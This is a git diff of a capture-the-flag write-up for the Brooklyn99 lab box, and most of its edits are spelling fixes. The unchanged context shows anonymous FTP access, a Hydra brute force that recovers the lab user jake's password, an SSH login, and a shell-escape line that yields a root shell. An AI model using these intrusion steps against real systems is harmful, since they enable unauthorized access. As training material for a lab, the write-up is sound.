@@ -1,12 +1,12 @@
 # Brooklyn99 CTF
 export ip=10.10.15.26
 ## Enumeration
-Going to the site and cheching the html we can see this 
+Going to the site and checking the html we can see this 
 ```html 
 <!-- Have you ever heard of steganography? -->
 ```
 **Intersting**   
-We are told there is 2 ways of getting to root in thi mahcine. Lets check both 
+There is 2 intended way of rooting the box. 
 ------------
 # Method one
 ### Nmap scan 
@@ -22,9 +22,9 @@ PORT   STATE SERVICE
 80/tcp open  http
 ````
 ### FTP 
-I didnt check if FTP has **Anonymous** login enabled but tried it and we can 
+I didnt check if FTP has **Anonymous** login enabled but tried it and we can login as anonymous. 
 
-navigathing  through we found this file
+navigating  through we found this file
 ```bash
 ftp> ls
 200 PORT command successful. Consider using PASV.
@@ -33,9 +33,8 @@ ftp> ls
 226 Directory send OK.
 ftp> get note_to_jake.txt
 ```
-this will download the text file to your machine. (you can also use mget command)
-This is the note thats left 
-
+We can download the text file to your machine through get. (you can also use mget command)
+The note we found is as follow
 >From Amy,
 
 >Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
@@ -43,7 +42,7 @@ This is the note thats left
 This might come in handy knowing jake ```"Detective Jake Peralta(holts voice)"``` uses weak password :).
 
 **``Username : jake``**
-lets brut force
+lets try to brute force the accound jake with rock you
 
 ### Hydra
 ```bash
@@ -55,7 +54,7 @@ host: 10.10.15.26   login: jake   password: 987654321
 ```  
 Oh dear jake u failed us hope this wont let me in .  
 ```ssh jake@'ur_ip_here'```  
-And we are in. Oh Jake Peralta Amy would be dissapointed   
+And we are in. **Oh Jake Peralta Amy would be disappointed**
 
 ## Privilege Escalation
 ```bash
@@ -97,7 +96,7 @@ root.txt
 Lets explore some  
 ```bash
 └─# exiftool brooklyn99.jpg 
-ExifTool Version Number         : 12.39
+ExifTool Version Number         : 
 File Name                       : brooklyn99.jpg
 Directory                       : .
 File Size                       : 68 KiB
@@ -177,6 +176,5 @@ Command to execute: reset; sh 1>&0 2>&0#
 root
 # 
 ````
-
 We have found both ways to root the box. 
 --------
